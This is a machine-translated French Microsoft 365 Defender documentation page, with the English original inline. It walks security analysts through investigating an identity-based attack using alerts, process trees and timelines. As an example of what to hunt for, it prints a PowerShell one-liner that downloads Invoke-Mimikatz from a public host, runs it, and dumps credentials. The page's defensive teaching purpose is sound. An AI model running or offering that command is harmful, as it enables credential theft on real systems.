---
title: Exemple d'attaque basée sur l'identité
description: Analyse pas à pas d'une attaque basée sur l'identité.
keywords: incidents, alertes, examiner, corrélation, attaque, ordinateurs, appareils, utilisateurs, identités, identité, boîte aux lettres, courrier électronique, 365, microsoft, m365, réponse aux incidents, cyber-attaque
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
ms.translationtype: MT
ms.contentlocale: fr-FR
ms.lasthandoff: 04/30/2021
ms.locfileid: "52114679"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="e5a11-104">Exemple d'attaque basée sur l'identité</span><span class="sxs-lookup"><span data-stu-id="e5a11-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="e5a11-105">**S’applique à :**</span><span class="sxs-lookup"><span data-stu-id="e5a11-105">**Applies to:**</span></span>
- <span data-ttu-id="e5a11-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="e5a11-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="e5a11-107">Microsoft Defender pour l'identité peut vous aider à détecter les tentatives malveillantes de compromission des identités dans votre organisation.</span><span class="sxs-lookup"><span data-stu-id="e5a11-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="e5a11-108">Dans la mesure où Defender pour l'identité s'intègre à Microsoft 365 Defender, les analystes de sécurité peuvent avoir une visibilité sur les menaces provenant de Defender for Identity, telles que les tentatives d'élévation de privilège Netlogon suspectes.</span><span class="sxs-lookup"><span data-stu-id="e5a11-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="e5a11-109">Analyse de l'attaque dans Microsoft Defender pour l'identité</span><span class="sxs-lookup"><span data-stu-id="e5a11-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="e5a11-110">Microsoft 365 Defender permet aux analystes de filtrer les alertes par source de détection sous **l'onglet Alertes** de la page Incidents.</span><span class="sxs-lookup"><span data-stu-id="e5a11-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="e5a11-111">Dans l'exemple suivant, la source de détection est filtrée sur **Defender for Identity**.</span><span class="sxs-lookup"><span data-stu-id="e5a11-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Exemple de filtrage de la source de détection pour Defender for Identity":::

<span data-ttu-id="e5a11-113">La sélection de **l'alerte d'attaque** suspectée de surpassage de hachage permet d'Microsoft Cloud App Security page qui affiche des informations plus détaillées.</span><span class="sxs-lookup"><span data-stu-id="e5a11-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="e5a11-114">Vous pouvez toujours en savoir plus sur une alerte ou une attaque en sélectionnant En savoir plus sur ce **type** d'alerte pour lire une [description](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) de l'attaque ainsi que des suggestions de correction.</span><span class="sxs-lookup"><span data-stu-id="e5a11-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](https://docs.microsoft.com/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Exemple d'alerte d'attaque par passe-viapasse suspectée"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="e5a11-116">Étude de la même attaque dans Microsoft Defender pour le point de terminaison</span><span class="sxs-lookup"><span data-stu-id="e5a11-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="e5a11-117">Un analyste peut également utiliser Defender pour point de terminaison pour en savoir plus sur l'activité sur un point de terminaison.</span><span class="sxs-lookup"><span data-stu-id="e5a11-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="e5a11-118">Sélectionnez l'incident dans la file d'attente des incidents, puis sélectionnez **l'onglet Alertes.** À partir de là, ils peuvent également identifier la source de détection.</span><span class="sxs-lookup"><span data-stu-id="e5a11-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="e5a11-119">Une source de détection étiquetée comme PEPT signifie Endpoint Detection and Response, qui est Defender for Endpoint.</span><span class="sxs-lookup"><span data-stu-id="e5a11-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="e5a11-120">À partir de là, l'analyste sélectionne une alerte détectée par PEPT.</span><span class="sxs-lookup"><span data-stu-id="e5a11-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Exemple de détection et de réponse de point de terminaison dans Defender pour le point de terminaison"::: 

<span data-ttu-id="e5a11-122">La page d'alerte affiche diverses informations pertinentes telles que le nom de l'appareil, le nom d'utilisateur, l'état de l'examen automatique et les détails de l'alerte.</span><span class="sxs-lookup"><span data-stu-id="e5a11-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="e5a11-123">L'article d'alerte représente une représentation visuelle de l'arborescence de processus.</span><span class="sxs-lookup"><span data-stu-id="e5a11-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="e5a11-124">L'arborescence de processus est une représentation hiérarchique des processus parents et enfants liés à l'alerte.</span><span class="sxs-lookup"><span data-stu-id="e5a11-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Exemple d'arborescence de processus d'alerte dans Defender pour le point de terminaison"::: 

<span data-ttu-id="e5a11-126">Chaque processus peut être étendu pour afficher des détails supplémentaires.</span><span class="sxs-lookup"><span data-stu-id="e5a11-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="e5a11-127">Les détails qu'un analyste peut voir sont les commandes réelles qui ont été entrées dans le cadre d'un script malveillant, les adresses IP de connexion sortante et d'autres informations utiles.</span><span class="sxs-lookup"><span data-stu-id="e5a11-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Exemple de détails de processus dans Defender pour le point de terminaison":::
 
<span data-ttu-id="e5a11-129">En sélectionnant **Voir dans la** chronologie, un analyste peut aller encore plus loin pour déterminer l'heure exacte de la compromission.</span><span class="sxs-lookup"><span data-stu-id="e5a11-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="e5a11-130">Microsoft Defender pour le point de terminaison peut détecter de nombreux fichiers et scripts malveillants.</span><span class="sxs-lookup"><span data-stu-id="e5a11-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="e5a11-131">Toutefois, en raison de nombreuses utilisations légitimes pour les connexions sortantes, PowerShell et l'activité de ligne de commande, certaines activités seraient considérées comme étant anodins jusqu'à ce qu'elles créent un fichier ou une activité malveillante.</span><span class="sxs-lookup"><span data-stu-id="e5a11-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="e5a11-132">Par conséquent, l'utilisation de la chronologie permet aux analystes de mettre l'alerte en contexte avec l'activité qui l'entoure pour déterminer la source ou l'heure d'origine de l'attaque qui, sinon, est masquée par l'activité courante du système de fichiers et des utilisateurs.</span><span class="sxs-lookup"><span data-stu-id="e5a11-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="e5a11-133">Pour ce faire, un analyste commence au moment de la détection de l'alerte (en rouge) et fait défiler vers le bas dans le temps pour déterminer à quel moment l'activité d'origine qui a conduit à l'activité malveillante a réellement commencé.</span><span class="sxs-lookup"><span data-stu-id="e5a11-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Exemple de démarrage au moment de la détection de l'alerte"::: 

<span data-ttu-id="e5a11-135">Il est important de comprendre et de distinguer les activités courantes telles que les connexions Windows Update, le trafic d'activation de logiciels de confiance Windows, d'autres connexions communes aux sites Microsoft, l'activité Internet tierce, l'activité Microsoft Endpoint Configuration Manager et toute autre activité faible contre les activités suspectes.</span><span class="sxs-lookup"><span data-stu-id="e5a11-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="e5a11-136">Une façon d'y parvenir consiste à utiliser des filtres de chronologie.</span><span class="sxs-lookup"><span data-stu-id="e5a11-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="e5a11-137">Il existe de nombreux filtres qui peuvent mettre en évidence une activité spécifique tout en filtrant tout ce que l'analyste ne souhaite pas afficher.</span><span class="sxs-lookup"><span data-stu-id="e5a11-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="e5a11-138">Dans l'image ci-dessous, l'analyste a filtré pour afficher uniquement les événements réseau et de traitement.</span><span class="sxs-lookup"><span data-stu-id="e5a11-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="e5a11-139">Cela permet à l'analyste de voir les connexions réseau et les processus qui entourent l'événement où Bloc-notes a établi une connexion avec une adresse IP, ce que nous avons également vu dans l'arborescence des processus.</span><span class="sxs-lookup"><span data-stu-id="e5a11-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Exemple de la façon Bloc-notes utilisé pour établir une connexion sortante malveillante"::: 

<span data-ttu-id="e5a11-141">Dans cet événement particulier, Bloc-notes utilisé pour établir une connexion sortante malveillante.</span><span class="sxs-lookup"><span data-stu-id="e5a11-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="e5a11-142">Toutefois, souvent, les personnes malveillantes utilisent simplement iexplorer.exe pour établir des connexions pour télécharger une charge utile malveillante, car en règle iexplorer.exe processus sont considérés comme une activité régulière du navigateur web.</span><span class="sxs-lookup"><span data-stu-id="e5a11-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="e5a11-143">Un autre élément à rechercher dans la chronologie serait l'utilisation de PowerShell pour les connexions sortantes.</span><span class="sxs-lookup"><span data-stu-id="e5a11-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="e5a11-144">L'analyste recherche les connexions PowerShell réussies avec des commandes telles qu'une connexion sortante à un site web hébergeant `IEX (New-Object Net.Webclient)` un fichier malveillant.</span><span class="sxs-lookup"><span data-stu-id="e5a11-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="e5a11-145">Dans l'exemple suivant, PowerShell a été utilisé pour télécharger et exécuter Mimikatz à partir d'un site web :</span><span class="sxs-lookup"><span data-stu-id="e5a11-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="e5a11-146">Un analyste peut rapidement rechercher des mots clés en tapant le mot clé dans la barre de recherche pour afficher uniquement les événements créés avec PowerShell.</span><span class="sxs-lookup"><span data-stu-id="e5a11-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="e5a11-147">Étape suivante</span><span class="sxs-lookup"><span data-stu-id="e5a11-147">Next step</span></span>

<span data-ttu-id="e5a11-148">Consultez le [chemin d'accès de l'enquête](first-incident-path-phishing.md) sur le hameçonnage.</span><span class="sxs-lookup"><span data-stu-id="e5a11-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="e5a11-149">Voir aussi</span><span class="sxs-lookup"><span data-stu-id="e5a11-149">See also</span></span>

- [<span data-ttu-id="e5a11-150">Vue d’ensemble des incidents</span><span class="sxs-lookup"><span data-stu-id="e5a11-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="e5a11-151">Gérer des incidents</span><span class="sxs-lookup"><span data-stu-id="e5a11-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="e5a11-152">Analyser des incidents</span><span class="sxs-lookup"><span data-stu-id="e5a11-152">Analyze incidents</span></span>](investigate-incidents.md)
